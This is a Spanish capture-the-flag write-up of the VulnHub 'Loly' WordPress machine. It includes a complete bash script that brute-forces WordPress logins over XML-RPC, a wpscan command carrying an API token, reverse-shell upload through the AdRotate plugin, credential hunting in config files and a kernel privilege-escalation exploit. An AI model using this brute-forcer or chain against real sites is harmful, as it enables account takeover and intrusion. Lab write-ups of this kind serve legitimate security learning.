----
- Tags:  #writeup #info #vulnhub #tutorial #wordpress #github 
-----

- Enumeracion con [[Wpscan]] , Detecatamos usuario *loly* y el plugin *AdRotate*.
```bash
wpscan --url http://192.168.3.160/blog/ --enumerate u,vp --plugins-detection aggressive --api-token='JCC8LTpALyVB9OA0wb3HyrnKdCXSZ9CaysMsZ7sxYHI'
```


- La contraseña la rompemos con el mismo [[Wpscan]], pero aparte creamos un script a mano, para romperlo a traves del *XMLRPC*
```bash
#!/bin/bash

#Author: TLuisillo_o X S4vitar

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
	echo -e "\n\n${redColour}[!] Saliendo...${endColour}\n"
	exit 1
}


#CTRL C
trap ctrl_c SIGINT

function helpPanel(){
	echo -e "\n${redColour}[+] Uso:${endColour}${grayColour} $0 -u <Usuario> -w <Diccionario>${endColour} "
	exit 1
}

# Parameter Counter
declare -i parameter_counter=0

while getopts "u:w:h" arg; do
	case $arg in
		u) username=$OPTARG && let parameter_counter+=1;;
		w) wordlist=$OPTARG && let parameter_counter+=1;;
		h) helpPanel
	esac
done	

# Make XML
function makeXML(){
	username=$1
	wordlist=$2

	cat $wordlist | while read password; do
		xmlFile="""
		<methodCall>
		<methodName>wp.getUsersBlogs</methodName>
		<params>
		<param><value>loly</value></param>
		<param><value>$password</value></param>
		</params>
		</methodCall>
		"""
		echo $xmlFile > data.xml
		
		response=$(curl -s -X POST "http://loly.lc/wordpress/xmlrpc.php" -d@data.xml)
		if [ ! "$(echo $response | grep -E 'Incorrect username or password.|parse error. not well formed')" ]; then
			echo -e "\n\n${greenColour}[+] ${endColour}La Contraseña es:${greenColour} $password${endColour}"
			exit 0
		fi
		
	done
}

if [ $parameter_counter -eq 2 ]; then
 	if [ -f $wordlist ]; then 
		makeXML $username $wordlist
 	else
		echo -e "\n${redColour}[!] El archivo${grayColour} $wordlist ${redColour}no existe${endColour}"
 	fi
else
	helpPanel
fi


```

- Una vez tenemos las credenciales validas del [[WordPress]] , en la seccion de plugins detectamos que efectivamente, está disponble el *AdRotate*.
- En la seccion del plugin hay una opcion la cual nos permite la *subida de archivos*, entre ellas de tipo *zip* que automaticamente se extraen y se almacenan en */banners*
- Subimos la tipica *ReverseShell - WebShell*, y entablamos una consola interactiva

---
# Privesc

- Buscamos las credenciales del archivo de configuracion de [[WordPress]]
```bash
find / -name *config*.php
```

- Ingresamos al 2do usuario, *Loly* con dichas credenciales
- Por ultimo buscamos alguna via potencial de escalar privilegios, pero no encontramos *NADA*
- Pero vemos que la version del kernel está algo *Desactualizada* por lo cual podemos abusar con el uso de *Scripts de Kernel*
-  [linux/local/45010.c]()  *Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation  *
- Con ese exploit conseguimos elevar nuestro privilegio a *Root*